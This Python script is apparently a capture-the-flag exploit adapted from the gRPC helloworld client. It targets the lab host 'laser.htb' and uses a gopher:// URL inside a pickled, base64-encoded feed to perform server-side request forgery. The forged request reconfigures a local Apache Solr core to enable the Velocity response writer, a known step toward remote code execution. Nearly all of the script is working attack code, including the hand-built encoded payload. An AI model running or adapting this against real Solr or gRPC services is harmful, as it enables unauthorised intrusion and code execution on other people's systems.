# Copyright 2015 gRPC authors.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
"""The Python implementation of the GRPC helloworld.Greeter client."""

from __future__ import print_function
import logging

import grpc
import base64
import s_pb2
import s_pb2_grpc
import json
import pickle

def make_data(port):
    # use gopher to emulate this post request
    '''
    _POST /solr/staging HTTP/1.1
    Host: 127.0.0.1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
    Accept: */*
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Content-Type: application/x-www-form-urlencoded
    Cache: no-cache
    Connection: close

    {"update-queryresponsewriter": {"startup": "lazy", "name": "velocity", "class": "solr.VelocityResponseWriter", "template.base.dir": "", "solr.resource.loader.enabled": "true", "params.resource.loader.enabled": "true"}}


    '''

    payload = "_POST%20%2Fsolr%2Ffeed_engine%20HTTP%2F1.1%0AHost%3A%20127.0.0.1%0AUser-Agent%3A%20Mozilla%2F5.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64%3B%20rv%3A69.0)%20Gecko%2F20100101%20Firefox%2F69.0%0AAccept%3A%20*%2F*%0AAccept-Language%3A%20zh-CN%2Czh%3Bq%3D0.8%2Czh-TW%3Bq%3D0.7%2Czh-HK%3Bq%3D0.5%2Cen-US%3Bq%3D0.3%2Cen%3Bq%3D0.2%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0ACache%3A%20no-cache%0AConnection%3A%20close%0A%0A%7B%22update-queryresponsewriter%22%3A%20%7B%22startup%22%3A%20%22lazy%22%2C%20%22name%22%3A%20%22velocity%22%2C%20%22class%22%3A%20%22solr.VelocityResponseWriter%22%2C%20%22template.base.dir%22%3A%20%22%22%2C%20%22solr.resource.loader.enabled%22%3A%20%22true%22%2C%20%22params.resource.loader.enabled%22%3A%20%22true%22%7D%7D%0A%0A"

    p = '{"version": "v1.0","title": "Printer Feed","home_page_url": "http://localhost:' + port + '","feed_url": "gopher://localhost:8983/' +payload+ '"}'

    # For storing 
    p = pickle.dumps(p)     # type(b) gives <class 'bytes'> 
    p = base64.b64encode(p)
    return p 

def run(t):
    # NOTE(gRPC Python Team): .close() is possible on a channel and should be
    # used in circumstances in which the with statement does not fit the needs
    # of the code.
    with grpc.insecure_channel('laser.htb:9000') as channel:
        stub = s_pb2_grpc.PrintStub(channel)

        d = s_pb2.Content(
                data = t,
                )

        response = stub.Feed(d)

    print(response)
    print("Greeter client received: " + response.feed)


if __name__ == '__main__':
    port = "8983"
    temp = make_data(port)
    run(temp)
